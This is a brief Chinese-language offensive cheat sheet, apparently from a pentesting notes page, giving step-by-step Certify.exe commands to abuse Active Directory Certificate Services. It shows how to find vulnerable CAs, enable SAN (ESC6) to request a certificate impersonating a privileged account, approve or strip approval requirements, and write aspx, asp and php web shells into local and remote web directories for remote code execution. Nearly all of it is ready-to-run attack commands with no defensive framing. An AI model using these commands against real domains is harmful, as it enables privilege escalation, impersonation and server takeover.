	检测允许低权限用户ManageCA 或Manage Certificates权限 的 CA
	>Certify.exe find /vulnerable
	更改 CA 设置以为易受攻击的 CA (ESC6) 下的所有模板启用 SAN 扩展
	>Certify.exe setconfig /enablesan /restart
	使用所需的 SAN 请求证书。
	>Certify.exe request /template:User /altname:super.adm
	如果需要，授予批准或禁用批准要求
	授予
	>Certify.exe issue /id:[REQUEST ID]
	禁用
	>Certify.exe setconfig /removeapproval /restart
	从ManageCA到ADCS 服务器上的RCE的替代利用：

	获取当前的 CDP 列表。 用于查找远程可写共享：
	Certify.exe writefile /ca:SERVER\ca-name /readonly

	将 aspx shell 写入本地 Web 目录：
	Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

	将默认的 asp shell 写入本地 web 目录：
	Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

	将 php shell 写入远程 Web 目录：
	Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php